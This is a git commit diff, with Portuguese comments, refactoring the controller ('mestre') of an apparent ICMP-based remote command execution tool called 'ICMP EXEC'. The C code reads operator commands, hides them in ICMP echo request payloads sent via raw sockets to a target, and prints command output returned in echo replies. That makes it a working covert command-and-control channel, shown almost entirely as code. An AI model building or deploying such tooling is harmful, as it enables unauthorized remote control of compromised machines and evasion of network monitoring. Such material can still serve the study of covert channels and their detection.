92ceaf52fa798b5d791fb9f0281f3e3529ffa9eb
ErickCamillo <erick65738@gmail.com>
2021-11-18 22:01:57 -0300

    Refatoração do codigo e adicionado controle de exibição da saída do comando por IP

--- mestre.c
+++ mestre.c
@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <errno.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/time.h>
@@ -10,136 +11,149 @@
 #include <netinet/ip_icmp.h>
 #include <netdb.h>
 
-// ICMP EXEC - MESTRE
+#define MAXTIME 5
+#define BUFSIZE 1024
 
-// Limite de tempo que o socket deve esperar por respostas
-#define TEMPO_LIMITE 5
-
-struct pacote{
-	struct icmphdr hdr;
-	char msg[200];
-}packet;
-struct icmphdr *icmp;
-struct iphdr *iph;
-struct sockaddr_in dst_addr , src_addr;
-struct timeval timeout;
-struct hostent *host;
-
-int icmp_cc(char *ip);
 unsigned short checksum(void *b, int len);
+char *getip(char *target);
+int setsocktimeout(int socket);
 
 int main(int argc , char *argv[])
 {
+	int bytesent , bytesrecv , errcode , packetsize , sock;
+	char command[BUFSIZE] , icmpreply[BUFSIZE] , *payload , *ip, *packet , *data;
+
+	struct icmphdr *icmpheader, *icmpreply_header;
+	struct iphdr *ipheader;
+	struct sockaddr_in dst_addr , src_addr;
+
 	if(argc != 2)
 	{
-		fprintf(stderr , "Use: %s [ALVO].\n",argv[0]);
-		return 1;
+		printf("Use: %s [ALVO].\n",argv[0]);
+		return EXIT_SUCCESS;
 	}
-
-	host = gethostbyname(argv[1]);
-	if(host == NULL)
+	else if(getuid() != 0)
 	{
-		fprintf(stderr , "%s" , "> [ERRO]: Erro ao resolver host.\n");
-		return 1;
+		fprintf(stderr , "[INFO] Permissão negada !\nO programa deve ser executado como root.\n");
+        return EXIT_FAILURE;
 	}
-
-	int status = icmp_cc(inet_ntoa(*((struct in_addr*)host->h_addr)));
-	if(status == -1)
+ 
+ 	ip = getip(argv[1]);
+	if(ip == NULL)
 	{
-		fputs("> [ERRO]: Erro ao criar socket.\n",stderr);
-		return 1;
+		fprintf(stderr , "[ERRO] Getip: não foi possivel resolver o endereço de destino\n%s",argv[1]);
+		return EXIT_FAILURE;
 	}
 
-	return 0;
-}
+	sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
+	if(sock == -1)
+	{
+		perror("[ERRO] Socket");
+		return EXIT_FAILURE;
+	}
 
-// Checksum do protocolo icmp
-unsigned short checksum(void *b, int len) 
-{    unsigned short *buf = b; 
-    unsigned int sum=0; 
-    unsigned short result; 
-  
-    for ( sum = 0; len > 1; len -= 2 ) 
-        sum += *buf++; 
-    if ( len == 1 ) 
-        sum += *(unsigned char*)buf; 
-    sum = (sum >> 16) + (sum & 0xFFFF); 
-    sum += (sum >> 16); 
-    result = ~sum; 
-    return result; 
-}
-
-// Envia comandos para o servidor
-int icmp_cc(char *ip)
-{
-	int bytes_enviados , bytes_recebidos , tamanho_addr = sizeof(struct sockaddr_in) , ttl_val = 64;
-	char buf[30] , buffer[1024] , *pay;
-	int i = 1;
-
-	// Tempo maximo para aguardar resposta
-	timeout.tv_sec = TEMPO_LIMITE;
-	timeout.tv_usec = 0;
-
-	// Cria o socket 
-	int sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
-	if(sock == -1) return -1;
+	errcode = setsocktimeout(sock);
+	if(errcode != 0) 
+	{
+		fprintf(stderr , "[ERRO] Setsocktimeout: %s\n", strerror(errcode));
+		return EXIT_FAILURE;
+	}
 
 	// Destino do pacote
 	dst_addr.sin_family = AF_INET;
 	dst_addr.sin_addr.s_addr = inet_addr(ip);
 
-	// Setando ttl e tempo de espera de cada resposta
-	setsockopt(sock , SOL_IP , IP_TTL , &ttl_val , sizeof(ttl_val));
-	setsockopt(sock , SOL_SOCKET , SO_RCVTIMEO , (const char*)&timeout , sizeof(timeout));
-
-	printf("> ICMP MESTRE - Mestre\n");
-	printf("> Iniciando...\n");
-
-	while(1)
+	for(int seq = 1;;++seq)
 	{
-		bzero(&packet , sizeof (packet));
+		bytesent = bytesrecv = packetsize = 0;
 
-		// Payload
-		for(int k = 0; k < sizeof(packet.msg);++k) packet.msg[k] = '\0';
-		printf("$ ") , fgets(buf , sizeof(buf) , stdin);
-		memcpy(packet.msg , buf , strlen(buf));
+		printf("┌──(ICMP EXEC/Mestre -> %s)\n",ip);
+		printf("└─# "), fgets(command , sizeof(command) , stdin);
 
-		// Cabeçalho icmp
-		packet.hdr.type = ICMP_ECHO;
-		packet.hdr.code = 0;
-		packet.hdr.un.echo.id = getpid();
-		packet.hdr.un.echo.sequence = i;
-		packet.hdr.checksum = checksum(&packet , sizeof(packet));
+		packetsize = sizeof(struct icmphdr) + strlen(command) + 1;
+		packet = (char *)calloc(sizeof(char) , packetsize);
 
-		// Envia um echo request para o alvo com o comando
-		bytes_enviados = sendto(sock , &packet ,sizeof(packet) , 0 , (struct sockaddr *)&dst_addr , sizeof(dst_addr));
-		if(bytes_enviados <= 0) printf("> [ERRO]: Erro ao enviar pacote\n");
+		icmpheader = (struct icmphdr *)packet;
+		data = packet + sizeof(struct icmphdr);
 
-		// Lendo a respota
-		while((bytes_recebidos = read(sock , buffer , 1024)) > 0)
+		icmpheader->type = ICMP_ECHO;
+		icmpheader->code = 0;
+		icmpheader->un.echo.id = getpid();
+		icmpheader->un.echo.sequence = seq;
+
+		memcpy(data, command , strlen(command));
+		icmpheader->checksum = checksum(packet, packetsize);
+
+		// Envia um echo request para o destino com o comando
+		bytesent = sendto(sock , packet ,packetsize, 0 , (struct sockaddr *)&dst_addr , sizeof(dst_addr));
+		if(bytesent <= 0) perror("[ERRO] Sendto");
+
+		// Obtendo a resposta com a saida do comando
+		while((bytesrecv = recv(sock , icmpreply , sizeof(icmpreply) , 0)) > 0)
 		{
-        	if(bytes_recebidos > 0)
+        	if(bytesrecv > 0)
         	{
-            	iph = (struct iphdr *)buffer;
-           	 	if(bytes_recebidos > sizeof(struct iphdr))
-            	{
-                	bytes_recebidos -= sizeof(struct iphdr);
-                	icmp = (struct icmphdr *) (iph + 1);
-                	bytes_recebidos -= sizeof(struct icmphdr);
-                	pay = (char *)(icmp + 1);
-                	pay[bytes_recebidos] = '\0';
-                	printf("%s", pay);
-            	}               
-         
-        	}else printf("> Nenhum pacote recebido.\n");
-        }
+            	ipheader = (struct iphdr *)icmpreply;
+            	src_addr.sin_addr.s_addr = ipheader->saddr;
+            	icmpreply_header = (struct icmphdr *)(ipheader + 1);
 
-		bytes_recebidos = 0;
-		bytes_enviados = 0;
-		++i;
+           	 	if(bytesrecv > sizeof(struct iphdr) && src_addr.sin_addr.s_addr == dst_addr.sin_addr.s_addr &&
+           	 		icmpreply_header->type == ICMP_ECHOREPLY)
+            	{
+                	bytesrecv = (bytesrecv - sizeof(struct iphdr)) - sizeof(struct icmphdr); 
+                	payload = (char *)(icmpreply + sizeof(struct iphdr) + sizeof(struct icmphdr));
+                	payload[bytesrecv] = '\0';
+                	printf("%s", payload);
+            	}           
+         
+        	}
+        	else perror("[ERRO] Recv");
+        	
+        	memset(icmpreply, 0 , sizeof(icmpreply));
+        }
 	}
 
 	close(sock);
-	return 0;
+	return EXIT_SUCCESS;
+}
 
+// Calcula o checksum do cabeçalho ICMP
+unsigned short checksum(void *b, int len) 
+{    
+	unsigned short *buf = b; 
+    unsigned int sum = 0; 
+    unsigned short result; 
+  
+    for( sum = 0; len > 1; len -= 2 ) sum += *buf++; 
+    
+    if ( len == 1 ) sum += *(unsigned char*)buf; 
+    sum = (sum >> 16) + (sum & 0xFFFF); 
+    sum += (sum >> 16); 
+    result = ~sum; 
+    
+    return result; 
+}
+
+// Retorna o IP do destino
+char *getip(char *target)
+{
+	struct hostent *host;
+	host = gethostbyname(target);
+	if(host == NULL) return NULL;
+
+	return inet_ntoa(*((struct in_addr*)host->h_addr));
+}
+
+// Configura o limite de tempo do socket para cada leitura de pacotes.
+int setsocktimeout(int socket)
+{
+	struct timeval timeout;
+
+	timeout.tv_sec = MAXTIME;
+	timeout.tv_usec = 0;
+
+	// Setando timeout para a leitura dos pacotes
+	if((setsockopt(socket , SOL_SOCKET , SO_RCVTIMEO , (const char*)&timeout , sizeof(timeout))) < 0) return errno;
+
+	return 0;
 }
